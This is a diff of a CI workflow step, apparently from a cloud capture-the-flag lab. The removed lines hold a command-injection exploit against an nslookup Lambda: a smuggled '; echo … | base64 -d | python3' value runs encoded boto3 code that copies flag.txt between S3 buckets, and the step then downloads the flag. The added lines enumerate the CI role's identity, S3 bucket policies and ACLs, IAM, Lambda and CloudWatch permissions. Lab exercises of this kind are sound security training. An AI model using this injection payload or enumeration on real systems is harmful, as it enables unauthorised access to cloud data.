@@ -21,31 +21,39 @@ jobs:
 
       - name: Invoke Vulnerable Lambda
         run: |
-          API_ID="3q931syi7b"
-          REGION="us-east-1"
-          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
-          
-          # Create a bulletproof python snippet using boto3 to copy the file server-side
-          PY_CODE="import boto3\ns3 = boto3.client('s3')\ns3.copy_object(Bucket='site781fe43f26b9eba3', CopySource={'Bucket': 'codec4f26c862a321ef5', 'Key': 'flag.txt'}, Key='flag.txt')"
-          
-          # Base64 encode it so shell quoting never breaks
-          ENCODED_SCRIPT=$(echo -e "$PY_CODE" | base64 -w 0)
-          
-          PAYLOAD="{\"domain\": \"127.0.0.1; echo '${ENCODED_SCRIPT}' | base64 -d | python3\"}"
-          
-          echo "=== 1. TRIGGERING BACKEND S3 COPY ==="
-          curl -s -X POST "$URL" \
-            -H "Content-Type: application/json" \
-            -d "$PAYLOAD"
+          echo "=================================================="
+          echo "1. WHO AM I & SESSION DETAILS"
+          echo "=================================================="
+          aws sts get-caller-identity
           
           echo ""
-          echo "=== 2. WAITING 3 SECONDS FOR S3 PROPAGATION ==="
-          sleep 3
-          
-          echo "=== 3. DOWNLOADING FLAG FROM OPEN COMPANION BUCKET ==="
-          # Download directly from site781fe43f26b9eba3 where cicdRole has full permission!
-          aws s3 cp "s3://site781fe43f26b9eba3/flag.txt" ./the_real_flag.txt
+          echo "=================================================="
+          echo "2. S3 BUCKET ENUMERATION & PERMISSIONS AUDIT"
+          echo "=================================================="
+          for BUCKET_NAME in codec4f26c862a321ef5 platform-bucket-009661764077-us-east-1 site781fe43f26b9eba3; do
+            echo "--- Testing Bucket: $BUCKET_NAME ---"
+            aws s3 ls "s3://$BUCKET_NAME" || echo "Listing failed"
+            aws s3api get-bucket-policy --bucket "$BUCKET_NAME" 2>/dev/null || echo "No bucket policy readable"
+            aws s3api get-bucket-acl --bucket "$BUCKET_NAME" 2>/dev/null || echo "No bucket ACL readable"
+          done
           
           echo ""
-          echo "=== 4. BEHOLD YOUR VICTORY ==="
-          cat ./the_real_flag.txt
+          echo "=================================================="
+          echo "3. IAM ROLE & POLICY ATTACHMENT AUDIT"
+          echo "=================================================="
+          # Let's test what IAM actions we can perform on ourselves
+          aws iam get-user 2>/dev/null || echo "Not an IAM user (expected)"
+          aws sts get-access-key-info 2>/dev/null || echo "Access key info restricted"
+          
+          echo ""
+          echo "=================================================="
+          echo "4. LAMBDA CONFIGURATION & PERMISSION CHECK"
+          echo "=================================================="
+          aws lambda get-function --function-name nslookupv2 --query 'Configuration.[FunctionName, Role, Runtime]' --output json
+          aws lambda get-policy --function-name nslookupv2 2>/dev/null || echo "Lambda resource policy restricted"
+          
+          echo ""
+          echo "=================================================="
+          echo "5. CLOUDWATCH LOGS PERMISSION CHECK"
+          echo "=================================================="
+          aws logs describe-log-groups --region us-east-1 2>/dev/null || echo "Cannot describe log groups"
